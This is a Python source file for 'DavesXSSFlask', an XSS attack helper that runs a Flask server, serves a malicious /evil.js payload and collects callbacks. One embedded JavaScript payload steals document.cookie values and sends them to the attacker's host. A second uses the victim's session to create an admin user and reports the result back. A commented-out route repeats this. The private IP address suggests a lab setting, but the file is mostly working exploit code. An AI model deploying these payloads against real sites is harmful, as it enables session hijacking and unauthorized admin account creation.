"""DavesXSSFlask

Use this like a tiny exfiltration receiver for DOM-XSS cookie grabbing.

Example:
    with DavesXSSFlask(laddr="127.0.0.1", lport=4444) as xss:
        # trigger the JS in the victim page
        payload = xss.wait()
        print(payload)

This starts a Flask app on the chosen host/port and stores every callback hit as a
small dict like:
    {"h": "...", "v": "..."}

The queue holds these callback payloads in arrival order. Use wait() to block until the
next callback arrives.
"""

import threading
import time
from queue import Queue

from flask import Flask, Response, after_this_request, request
from flask_cors import CORS


EVIL_PAYLOAD = """
        (() => {
            const hash = btoa(document.cookie.slice(0, 15)).replace(/=/g, '');

            for (const cv of document.cookie.split(';')) {
                new Image().src = `http://LADDR:LPORT/answer.jpg?h=${hash}&v=${encodeURIComponent(cv.trim())}`;
            }
        })();
    """

EVIL_PAYLOAD_2  = """
        (function() {
            console.log('STARTING XSS EVIL')
            const start_time = Date.now();
            fetch("/admin/users/create", {
                method: 'POST', 
                body: new URLSearchParams({name: '' + start_time, isAdmin: 'True', isMod: 'True',
                    email: start_time + '@akademiasix.info'
                }), 
                credentials: 'include',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }).then(response => {
                const end_time = Date.now();
            
                response.text().then(text => {
                    if (text.includes('' + start_time)) {
                        const unixTimeMs = new Date(response.headers.get('Date')).getTime();
                        console.log('User created! Sending exfiltration...');
                        fetch(`http://LADDR:LPORT/user_created?start_time=${start_time}&end_time=${end_time}&server_time=${unixTimeMs}`);
                    } else {
                        console.log('User NOT created. Mod saw this.');
                        fetch(`http://LADDR:LPORT/user_not_created?`);
                    }
                });
            });
        })();
    """



# @app.route("/create_admin_user.js")
# def serve_js():
#     print(f"[+] The javascript was requested by a user.")
#     global user_name
#     user_name = uuid.uuid4().hex.strip()
#     print(f"[*] Attemptint to create user:\t{user_name}")
#
#     js_content = """
#     fetch("/admin/users/create", {
#         method: 'POST', 
#         body: new URLSearchParams({name: 'USER_NAME', isAdmin: 'True', isMod: 'True',
#             email: 'USER_NAME@akademiasix.info'
#         }), 
#         credentials: 'include',
#         headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
#     })
#     .then(response => {
#         var node = document.createElement("script");
#         node.src = `http://192.168.45.210:FLASK_PORT/user_created.js?user_name=USER_NAME`;
#         document.body.appendChild(node); 
#         console.log('USER CREATED: USER_NAME')
#     }).catch(error => {
#         console.log('SCRIPT LOADED but something broke: USER_NAME');
#     });
#     """.replace("USER_NAME", user_name).replace("FLASK_PORT", f"{FLASK_PORT}")
#
#     java_script_requested.set()
#     response = Response(js_content, mimetype="application/javascript")
#     response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
#     response.headers["Pragma"] = "no-cache"
#     response.headers["Expires"] = "0"
#
#     return response


class DavesXSSFlask:
    def __init__(self, laddr="0.0.0.0", lport=4444):
        self.app = Flask(__name__)
        CORS(self.app)
        self.lhost = laddr
        self.lport = lport
        self.queue = Queue()
        self._thread = None
        self._payload_event = threading.Event()

    def  __enter__(self):
        return self.start()
    
    def start(self):    
        @self.app.route("/evil.js")
        def _evil_payload():
            javascript = EVIL_PAYLOAD.replace("LADDR", self.lhost).replace("LPORT", str(self.lport))
            response = Response(javascript, mimetype="application/javascript")
            response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"

            @after_this_request
            def _after_request(response):
                print(f"[+] The DOM-XSS has been sent")
                return response

            return response

        @self.app.route("/answer.jpg")
        def _handle_answer():
            payload = {
                "h": request.args.get("h"),
                "v": request.args.get("v"),
            }
            print(f"[+] Got exfiltration callback: {payload}")
            self.queue.put(payload)
            self._payload_event.set()
            return ""

        def _run():
            print("\n\n" + "=" * 66 + "\n1. [*] STARTING FLASK SERVER\n" + "=" * 66)
            self.app.run(host=self.lhost, port=self.lport, use_reloader=False, debug=False)

        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.daemon = True  # Ensures the server dies when main() exits
        self._thread.start()
        time.sleep(0.5)

        print(f"[+] Started Flask on {self.lport} via raw threading")
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        return self.stop()

    def stop(self):
        print("[*] Stopping Flask server...")
        if self._thread is not None:
            self._thread.join(timeout=0.5)
        

    def wait(self):
        self._payload_event.wait()
        self._payload_event.clear()
        return self.queue.get(timeout=1)

   
